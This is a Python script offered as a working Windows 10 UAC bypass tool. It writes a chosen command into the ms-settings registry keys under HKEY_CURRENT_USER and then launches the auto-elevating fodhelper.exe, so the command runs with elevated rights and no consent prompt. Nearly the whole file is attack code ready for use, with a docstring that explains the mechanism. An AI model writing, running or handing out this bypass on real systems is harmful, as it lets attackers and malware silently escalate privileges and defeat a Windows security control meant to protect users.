#!/usr/bin/env python
# -*- coding: utf-8; mode: python; py-indent-offset: 4; indent-tabs-mode: nil -*-
# vim: fileencoding=utf-8 tabstop=4 expandtab shiftwidth=4

'''
The w10uac is a tool that performs a Windows 10 UAC bypass. It exploits a vulnerabilty found
during the execution of a trusted binary called fodhelper.exe.
When the binary fodhelper.exe is executed, the OS looks for additional commands to be executed
based on two registry keys:

Software\Classes\ms-settings\shell\open\command\(default)
Software\Classes\ms-settings\shell\open\command\DelegateExecute

Since the fodhelper.exe binary has "auto-elevation" settings, the UAC prompt won't show during
its execution, which also executes any command registered in the above keys without any consent.

Note: This script only works if the user is party of the operating system's administrator group.
'''

import argparse
import os
import sys
import subprocess
import _winreg
import logging as log

parser = argparse.ArgumentParser(prog='w10uac', description='')
parser.add_argument('-c', '--command', metavar = '', required = True, help = 'The command to be executed')
parser.add_argument('-e', '--execute', action = 'store_true', help = 'Executes the given command with the UAC bypass')
parser.add_argument('-v', '--verbose', action = 'store_true', help = 'Enables the verbose mode')

banner = '''
 ----------------
| W10 UAC Bypass |
 ----------------

@version 1.0.0
@author  tommelo
'''

REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
DEFAULT_REG_KEY       = None
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'

def create_reg_key(key, value):
    '''
    Creates a registry key
    '''
    try:
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)
        _winreg.CloseKey(registry_key)
    except WindowsError:
        raise

def register_uac_bypass(cmd):
    '''
    Registers the command to be executed with an UAC bypass
    '''
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(DEFAULT_REG_KEY, cmd)
    except WindowsError:
        raise

def execute(args):
    '''
    Executes the Windows 10 UAC bypass
    '''
    if args.verbose:
        log.basicConfig(format = '%(message)s', level = log.DEBUG)

    log.info(banner)

    try:

        log.info('[+] Registering the command: {}'.format(args.command))
        register_uac_bypass(args.command)
        log.info('[+] Command successfully registered!')

        if args.execute:
            log.info('[+] Flag --execute enabled, trying to execute the command...')
            subprocess.call([FOD_HELPER], shell=True)

    except WindowsError as error:
        log.info('[!] Unable to complete the UAC bypass')
        log.error(error)
        sys.exit(1)

    log.info('[+] All done')
    sys.exit(0)

if __name__ == '__main__':
    try:
        args = parser.parse_args()
        execute(args)
    except KeyboardInterrupt:
        sys.exit(0)
